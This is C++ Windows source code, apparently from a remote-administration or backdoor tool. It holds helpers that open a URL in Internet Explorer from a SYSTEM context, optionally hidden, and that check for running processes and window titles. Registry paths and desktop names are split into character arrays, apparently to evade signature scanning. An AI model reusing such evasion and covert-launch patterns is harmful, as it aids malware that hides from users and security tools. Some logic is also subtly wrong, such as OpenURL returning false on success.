
#include "../stdafx.h"
#include <tchar.h>
#include "tlhelp32.h"

//发送消息
// struct MSGBOX
// {
// 	CHAR Title[200];
// 	CHAR szText[1000];
// 	UINT Type;
// }MsgBox;
// 
// void Loop_MsgBox(LPVOID lParam)
// {
// 	memcpy(&MsgBox,lParam,sizeof(MSGBOX));
// 	MessageBox(NULL,MsgBox.szText,MsgBox.Title,MsgBox.Type|MB_SYSTEMMODAL);
// }

// 打开网页
bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (strlen(lpszURL) == 0)
		return false;
	
	// System 权限下不能直接利用shellexecute来执行
	char BvtmX02[] = {'A','p','p','l','i','c','a','t','i','o','n','s','\\','i','e','x','p','l','o','r','e','.','e','x','e','\\','s','h','e','l','l','\\','o','p','e','n','\\','c','o','m','m','a','n','d','\0'};
	char	*lpSubKey = BvtmX02;
	HKEY	hKey;
	char	strIEPath[MAX_PATH]={0};
	LONG	nSize = sizeof(strIEPath);
	char	*lpstrCat = NULL;
	
	//访问注册表 iexplore.exe 文件是否存在
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		return false;
	
	RegQueryValue(hKey, NULL, strIEPath, &nSize);
	RegCloseKey(hKey);
	
	if (lstrlen(strIEPath) == 0)
		return false;
	
	char ZYPYd10[] = {'%','1','\0'};
	lpstrCat = strstr(strIEPath, ZYPYd10);
	if (lpstrCat == NULL)
		return false;

	lstrcpy(lpstrCat, lpszURL);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char BvtmX01[] = {'W','i','n','S','t','a','0','\\','D','e','f','a','u','l','t','\0'};
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = BvtmX01; 
	
	CreateProcess(NULL, strIEPath, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
	return 0;
}

BOOL proc_tag = false;
TCHAR temp_proc[1024]={0};
BOOL EnumProcesin(LPTSTR lpProcess)
{
	
	HANDLE handle=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 info;
    info.dwSize=sizeof(PROCESSENTRY32);
	if(Process32First(handle,&info))
	{
		if(GetLastError()==ERROR_NO_MORE_FILES )
		{
			return false;
		}
		else{
			
			if (wcsstr(wcsupr((wchar_t *)info.szExeFile),wcsupr((wchar_t *)lpProcess)) > 0)
			{
				return true;
			}
			while(Process32Next(handle,&info)!=FALSE)
			{
				char *str0 = info.szExeFile;
				_tcslwr(str0);
				_tcslwr(lpProcess);
				if (strstr(str0,lpProcess)!=NULL)  //比较字符
					return true;
// 				if (wcsstr((wchar_t *)str0,(wchar_t *)lpProcess) > 0)
// 				{
// 					CloseHandle(handle);
// 					return true;
// 				}
			}
		}
	}
	
	CloseHandle(handle);
	return false;
	
}

//枚举窗体是否存在
BOOL CALLBACK EnumWindowsList(HWND hwnd, LPARAM lParam)
{
	HINSTANCE user32 = LoadLibrary(_T("user32.dll"));
	
	typedef BOOL (WINAPI *GWTW)(HWND ,LPTSTR ,int ); 
	GWTW myGetWindowText;  
#ifdef UNICODE
	myGetWindowText= (GWTW)GetProcAddress(user32, "GetWindowTextW");
#else
	myGetWindowText= (GWTW)GetProcAddress(user32, "GetWindowTextA");
#endif
	
	TCHAR szClassName[254]={0};
	myGetWindowText(hwnd,szClassName,254);
	if (_tcsstr(szClassName,temp_proc) != NULL)
	{
		proc_tag = true;
	}
	if(user32)
		FreeLibrary(user32);
	return true;
}
